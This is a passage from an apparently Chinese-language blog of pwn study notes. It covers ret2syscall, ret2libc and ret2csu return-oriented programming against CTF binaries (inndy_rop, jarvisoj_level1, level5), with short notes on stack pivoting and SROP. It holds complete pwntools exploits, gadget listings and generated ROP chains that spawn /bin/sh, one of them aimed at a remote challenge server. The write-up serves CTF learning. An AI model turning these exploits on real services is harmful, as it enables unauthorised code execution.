<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x080b8016 : pop eax ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080de769 : pop ecx ; ret</span><br><span class="line">0x0806ecda : pop edx ; ret</span><br></pre></td></tr></table></figure>

<p>搜索  int 0x80 需要用到 Ropper 工具。（这个工具必须在python3环境下使用）</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/robotech/p/16220623.html">Rop gadgets搜索工具 Ropper 的安装与使用 - robotech_erx - 博客园 (cnblogs.com)</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/buu/inndy_rop$ ropper --file rop --search &quot;int 0x80&quot;</span><br><span class="line">[INFO] Load gadgets for section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching for gadgets: int 0x80</span><br><span class="line"></span><br><span class="line">[INFO] File: rop</span><br><span class="line">0x0806c943: int 0x80; </span><br><span class="line">0x0806f430: int 0x80; ret;</span><br></pre></td></tr></table></figure>

<p>bss的地址选取任意可读可写的地址即可，这里的地址是在动调时随意取的：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/inddy_rop.png" class="">

<p>构造 ROP 链，写出 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># p = process(&quot;./rop&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26428</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b8016</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080de769</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806ecda</span></span><br><span class="line">int_0x80_ret = <span class="number">0x0806f430</span></span><br><span class="line">bss = <span class="number">0x080e9000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read()</span></span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0x03</span>) </span><br><span class="line">payload += p32(pop_ebx_ret) + p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(pop_ecx_ret) + p32(bss+<span class="number">0x100</span>)</span><br><span class="line">payload += p32(pop_edx_ret) + p32(<span class="number">0x8</span>)</span><br><span class="line">payload += p32(int_0x80_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exceve()</span></span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0x0b</span>)</span><br><span class="line">payload += p32(pop_ebx_ret) + p32(bss+<span class="number">0x100</span>)</span><br><span class="line">payload += p32(pop_ecx_ret) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(pop_edx_ret) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_0x80_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="方法二、对于静态链接的程序使用工具直接生成ropchain"><a href="#方法二、对于静态链接的程序使用工具直接生成ropchain" class="headerlink" title="方法二、对于静态链接的程序使用工具直接生成ropchain"></a>方法二、对于静态链接的程序使用工具直接生成ropchain</h5><p>使用 ropper 生成：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/buu/inndy_rop$ ropper --file rop --chain execve</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line"></span><br><span class="line">[INFO] ROPchain Generator for syscall execve:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] </span><br><span class="line">write command into data section</span><br><span class="line">eax 0xb</span><br><span class="line">ebx address to cmd</span><br><span class="line">ecx address to null</span><br><span class="line">edx address to null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] Try to create chain which fills registers without delete content of previous filled registers</span><br><span class="line">[*] Try permuation 1 / 24</span><br><span class="line">[INFO] Look for syscall gadget</span><br><span class="line"></span><br><span class="line">[INFO] syscall gadget found</span><br><span class="line">[INFO] generating rop chain</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env python</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Generated by ropper ropchain generator <span class="comment">#</span></span></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">p = lambda x : pack(&#x27;I&#x27;, x)</span><br><span class="line"></span><br><span class="line">IMAGE_BASE_0 = 0x08048000 # 487729c3b55aaec43deb2af4c896b16f9dbd01f7e484054d1bb7f24209e2d3ae</span><br><span class="line">rebase_0 = lambda x : p(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">rop = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; </span><br><span class="line">rop += &#x27;//bi&#x27;</span><br><span class="line">rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; </span><br><span class="line">rop += rebase_0(0x000a2060)</span><br><span class="line">rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; </span><br><span class="line">rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; </span><br><span class="line">rop += &#x27;n/sh&#x27;</span><br><span class="line">rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; </span><br><span class="line">rop += rebase_0(0x000a2064)</span><br><span class="line">rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; </span><br><span class="line">rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; </span><br><span class="line">rop += p(0x00000000)</span><br><span class="line">rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; </span><br><span class="line">rop += rebase_0(0x000a2068)</span><br><span class="line">rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; </span><br><span class="line">rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; </span><br><span class="line">rop += rebase_0(0x000a2060)</span><br><span class="line">rop += rebase_0(0x00096769) # 0x080de769: pop ecx; ret; </span><br><span class="line">rop += rebase_0(0x000a2068)</span><br><span class="line">rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; </span><br><span class="line">rop += rebase_0(0x000a2068)</span><br><span class="line">rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; </span><br><span class="line">rop += p(0x0000000b)</span><br><span class="line">rop += rebase_0(0x00027430) # 0x0806f430: int 0x80; ret; </span><br><span class="line">print(rop)</span><br><span class="line">[INFO] rop chain generated!</span><br></pre></td></tr></table></figure>

<p>使用 ROPgadgets 生成：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>

<p>我用 ROPgadgets 总是生成不成功，怪。</p>
<p>直接在自动生成的 ROP 前面加上溢出量即可。</p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>控制程序执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置（即函数对应的 got 表项的内容）。一般选择执行 system（”&#x2F;bin&#x2F;sh”）。</p>
<h4 id="例题1：jarvisoj-level1-二解"><a href="#例题1：jarvisoj-level1-二解" class="headerlink" title="例题1：jarvisoj_level1 二解"></a>例题1：jarvisoj_level1 二解</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> <span class="comment">// 32bit没有开任何保护</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p?\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次直接利用溢出，构造 rop 链调用 write(1, xx_got, 4) 泄露 libc 基地址 ——&gt; 再次调用 main 函数 ——&gt; 根据 libc 基址得到 system 和 &#x2F;bin&#x2F;sh 字符串地址 ——&gt; 再次利用漏洞构造 rop 调用 system(‘&#x2F;bin&#x2F;sh’)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line"></span><br><span class="line">level1 = ELF(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">write_plt = level1.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = level1.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x080484B7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># use write() to leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&quot;read_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_addr)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr -libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">log.success(<span class="string">&quot;bin_sh_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the flag                                 </span></span><br><span class="line"><span class="comment"># p32(0) is a fake ret_addr</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">136</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候我们很难找到每个寄存器对应的 gadgets。此时，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/libc_csu.png" class="">

<p>loc_4006A6 作为 gadget1 ，利用栈对一系列寄存器进行赋值。</p>
<p>loc_400690 作为 gadget2。</p>
<p>二者组合可以实现rdi，rsi，rdx寄存器的赋值，并通过 r12 和 rbx 实现系统调用。</p>
<h4 id="如何构造-ROP-链？"><a href="#如何构造-ROP-链？" class="headerlink" title="如何构造 ROP 链？"></a>如何构造 ROP 链？</h4><p>假设要利用 csu 调用 write(1,write_got,8) 来达到泄露 libc。</p>
<ol>
<li><p>使用 call 调用write 需要 [r12+rbx*8] &#x3D; write_got</p>
</li>
<li><p>设置参数 edi &#x3D; r15d &#x3D;1, rsi &#x3D; r14 &#x3D; write_got, rdx &#x3D; r13 &#x3D; 8</p>
</li>
<li><p>不能让 jnz 跳转，继续向下执行（继续构造 ROP 链），需要 rbx + 1 &#x3D; rbp</p>
<p>rbx &#x3D; 0, rbp &#x3D; 1, r12 &#x3D; write_got</p>
</li>
</ol>
<p>布置好的栈表如下：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/csu_stack.png" class="">

<p>由于再一次执行 gadget1 时 rsp 依旧会 +8，因此当我们需要构造 ROP 覆盖返回地址时需要先填充 0x8 的 padding。</p>
<h4 id="例题1：蒸米-linux-x64-level5"><a href="#例题1：蒸米-linux-x64-level5" class="headerlink" title="例题1：蒸米 linux_x64 level5"></a>例题1：蒸米 linux_x64 level5</h4><p> 64 位程序，只开了 NX。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个思路是自己构造 ROP 实现系统调用。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/zhengminlevel5.png" class="">

<p>很明显可以用的 gadgets 不够。</p>
<p>查看 csu：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/level5_csu.png" class="">

<p>overflow &#x3D;  b’a’*128</p>
<p>fake_ebp &#x3D; b’b’*8</p>
<p>stuff &#x3D; b’c’*0x38</p>
<p>fake_ret_addr &#x3D; p64(0)</p>
<p>gadget_1 &#x3D; 0x400606</p>
<p>gadget_2 &#x3D; 0x4005f0</p>
<p>利用 csu :</p>
<ol>
<li><p><strong>write(rdi &#x3D;1, rsi&#x3D;write_got, rdx &#x3D; 8)  泄露 libc 基址</strong></p>
<p>rdi &#x3D; r13 &#x3D; 1, rsi &#x3D; r14 &#x3D; write_got, rdx &#x3D; r15 &#x3D; 8, rbx &#x3D; 0, r12 &#x3D; write_got, rbp &#x3D; 1 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1 = overflow + fake_ebp + p64(gadget_1) + fake_ret_addr</span><br><span class="line">payload1 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>)</span><br><span class="line">payload1 += p64(gadget_2)</span><br><span class="line">payload1 += stuff</span><br><span class="line">payload1 += p64(main)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>read(rdi&#x3D;0, rsi&#x3D;bss_addr, rdx&#x3D;16)  把 system_addr 和 &#x2F;bin&#x2F;sh 字符串写入可读写段</strong></p>
<p>rdi &#x3D; r13 &#x3D; 0, rsi &#x3D; r14 &#x3D; bss_addr, rdx &#x3D; r15 &#x3D; 16, rbx &#x3D; 0, r12 &#x3D; read_got, rbp &#x3D; 1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload2 = overflow + fake_ebp + p64(gadget_1) + fake_ret_addr</span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>)</span><br><span class="line">payload2 += p64(gadget2)</span><br><span class="line">payload2 += stuff</span><br><span class="line">payload2 += p64(main)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>system(rdi &#x3D; bss_addr+8 &#x3D; “&#x2F;bin&#x2F;sh”)  get shell</strong></p>
<p>rdi &#x3D; r13 &#x3D; bss_addr+8, rsi &#x3D; r14 &#x3D; 0, rdx &#x3D; r15 &#x3D; 0, rbx &#x3D;0, r12 &#x3D; bss_addr, rbp &#x3D; 1 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload3 = overflow + fake_ebp + p64(gadget1) + fake_ret_addr</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(gadget2)</span><br><span class="line">payload3 += stuff</span><br><span class="line">payload3 += p64(main)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>写出整体的 exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_got)))</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read_got: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">main = <span class="number">0x400564</span></span><br><span class="line">overflow = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">128</span></span><br><span class="line">fake_ebp = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">stuff = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">rsp = p64(<span class="number">0</span>)</span><br><span class="line">gadget_1 = <span class="number">0x400606</span></span><br><span class="line">gadget_2 = <span class="number">0x4005f0</span></span><br><span class="line">bss_addr = <span class="number">0x601028</span></span><br><span class="line">payload1 = overflow + fake_ebp + p64(gadget_1) + rsp</span><br><span class="line">payload1 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>)</span><br><span class="line">payload1 += p64(gadget_2)</span><br><span class="line">payload1 += stuff</span><br><span class="line">payload1 += p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step 1:&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"></span><br><span class="line">payload2 = overflow + fake_ebp + p64(gadget_1) + rsp</span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">17</span>)</span><br><span class="line">payload2 += p64(gadget_2)</span><br><span class="line">payload2 += stuff</span><br><span class="line">payload2 += p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step 2:&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(p64(system_addr)+<span class="string">b&quot;/bin\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class="line">payload3 = overflow + fake_ebp + p64(gadget_1) + rsp</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(gadget_2)</span><br><span class="line">payload3 += stuff</span><br><span class="line">payload3 += p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step 3:&quot;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里有一个很奇怪的点，padding 处只使用字符 ‘\x00’ ，否则无法正常 getshell，也不知道是为什么。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>ret2xxx 根据 ROP 的 gadgets 来源进行分类。</p>
<p>ret2text：利用程序本身的 gadgets</p>
<p>ret2shellcode：利用输入的 gadgets，栈可执行可以把shellcode写在栈上，有可读可写可执行的段也行。</p>
<p>ret2syscall：利用 syscall 的 gadgets，一般用于静态链接的程序</p>
<p>ret2libc：利用 libc 中存在的 gadgets，适用于程序调用了 libc 中的函数但没有现成的后门函数</p>
<p>ret2csu：程序编译时存在的 gadgets 存在通用性</p>
<h2 id="栈迁移-stack-pivot"><a href="#栈迁移-stack-pivot" class="headerlink" title="栈迁移-stack pivot"></a>栈迁移-stack pivot</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39529207/article/details/123005057">栈迁移原理介绍与应用_Max1z的博客-CSDN博客</a></p>
<p>条件：</p>
<ol>
<li><p>存在栈溢出且大小至少能覆盖一个返回地址</p>
</li>
<li><p>存在可以控制内容的内存（栈、堆、bss），并且它们的地址可以被泄露，最简单的就是利用 printf 和 puts 这类函数。</p>
</li>
</ol>
<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>参考：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/en/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki (ctf-wiki.org)</a></p>
<p>全称为 Sigreturn Oriented Programming。Sigreturn 是一个系统调用，在 unix 系统发生 signal 的时候会被间接地调用。</p>
<hr>
<p>Unix系统的Signal机制是一种用于进程间通信和处理异步事件的重要机制。Signal是在Unix操作系统中用来通知进程发生了特定事件或异常情况的一种软件中断。当发生这些事件时，操作系统会向目标进程发送一个信号，该进程可以选择捕获、处理或忽略信号。</p>
